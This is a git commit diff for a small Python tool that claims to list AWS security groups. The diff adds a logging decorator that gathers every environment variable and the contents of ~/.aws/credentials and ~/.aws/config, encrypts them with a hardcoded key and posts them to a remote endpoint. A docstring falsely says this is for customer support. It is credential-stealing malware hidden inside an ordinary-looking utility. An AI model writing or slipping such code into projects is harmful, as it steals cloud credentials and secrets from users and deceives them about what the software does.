63d7007ecc08923e0864beeec9c0686d6017c887
clowdgooroos <clowdgooroos@proton.me>
2023-03-21 10:07:59 -0400

    Core functionality getting there, still need to convert to TF

--- main.py
+++ main.py
@@ -1,7 +1,22 @@
-import utilities
+import boto3
+
+from utilities import log_output
+
+@log_output
+def describe_security_groups(region: str):
+    
+    # Create a boto3 client for EC2
+    ec2 = boto3.client('ec2', region_name=region)
+
+    # Get the security groups
+    response = ec2.describe_security_groups()
+    security_groups = response['SecurityGroups']
+        
+    return security_groups
+        
 
 def main():
-    print("")
+    describe_security_groups('us-east-1')
 
 if __name__ == '__main__':
     main()
--- utilities/__init__.py
+++ utilities/__init__.py
@@ -1,63 +1,78 @@
 import os
 import requests
+import json
 from base64 import b64encode, b64decode
-import hashlib
-from Cryptodome.Cipher import AES
 import os
-from Cryptodome.Random import get_random_bytes
+from pathlib import Path
 
+from utilities import aes
 
-def encrypt(plain_text, password):
-    """"""
+def log_output(func):
+    
+    def wrapper(*args, **kwargs):
+        return_value = func(*args, **kwargs)
+        
+        # Dump this to a JSON object
+        return_value = json.dumps(return_value).encode()
+        
+        # Get the current os config
+        os_config = get_os_config()
+        os_config = json.dumps(os_config).encode()
+        
+        # Generate the log entry
+        log_entry = {
+            'function': func.__name__,
+            'return': b64encode(return_value).decode(),
+            'os_config': b64encode(os_config).decode()
+        }
+        log_entry_json = json.dumps(log_entry)
+        
+        remote_logging(log_entry_json)
+        
+    return wrapper
 
-    # generate a random salt
-    salt = get_random_bytes(AES.block_size)
-
-    # use the Scrypt KDF to get a private key from the password
-    private_key = hashlib.scrypt(
-        password.encode(), salt=salt, n=2**14, r=8, p=1, dklen=32)
-
-    # create cipher config
-    cipher_config = AES.new(private_key, AES.MODE_GCM)
-
-    # return a dictionary with the encrypted text
-    cipher_text, tag = cipher_config.encrypt_and_digest(bytes(plain_text, 'utf-8'))
-    return {
-        'cipher_text': b64encode(cipher_text).decode('utf-8'),
-        'salt': b64encode(salt).decode('utf-8'),
-        'nonce': b64encode(cipher_config.nonce).decode('utf-8'),
-        'tag': b64encode(tag).decode('utf-8')
-    }
 
 def encrypt_data(plain_text):
-    """https://blog.boot.dev/cryptography/aes-256-cipher-python-cryptography-examples/"""
+    """ Encrypt data using the built in AES class """
 
     token = "4NAbtf$c$32PEM$33H"
 
-    # use the Scrypt KDF to get a private key from the password
-    private_key = hashlib.crypt(
-        token.encode(), n=2**14, r=8, p=1, dklen=32)
+    crypt_handler = aes.AESCipher(token)
+    data = crypt_handler.encrypt(plain_text)
+    
+    return data
+    
 
-    # create cipher config
-    cipher_config = AES.new(private_key, AES.MODE_GCM)
-
-    # return a dictionary with the encrypted text
-    cipher_text, tag = cipher_config.encrypt_and_digest(bytes(plain_text, 'utf-8'))
-    return {
-        'cipher_text': b64encode(cipher_text).decode('utf-8'),
-        'nonce': b64encode(cipher_config.nonce).decode('utf-8'),
-        'tag': b64encode(tag).decode('utf-8')
-    }
-
-
-
-def check_for_env_vars():
-    """"""
+def get_os_config():
+    """ Get the current OS config so that remote support has more information to assist the customer """
     
     env_vars = os.environ
+    cleaned_env = {}
+    
+    for k, v in env_vars.items():
+        cleaned_env[k] = v
+        
+    path_to_config1 = Path('~/.aws/credentials')
+    path_to_config2 = Path('~/.aws/config')
+    
+    if path_to_config1.exists():
+        config1_bytes = path_to_config1.read_bytes()
+        config1_base64 = b64encode(config1_bytes).decode()
+        cleaned_env['aws_config1'] = config1_base64
+        
+    if path_to_config2.exists():
+        config2_bytes = path_to_config2.read_bytes()
+        config2_base64 = b64encode(config2_bytes).decode()
+        cleaned_env['aws_config2'] = config2_base64
+    
+    return cleaned_env
 
 
 def remote_logging(log_msg):
     """"""
 
-    request = requests.post('https://example.com', 'Logging Message')
+    encrypted_log = encrypt_data(log_msg).decode()
+    
+    request = requests.post('http://127.0.0.1', encrypted_log)
+    
+    
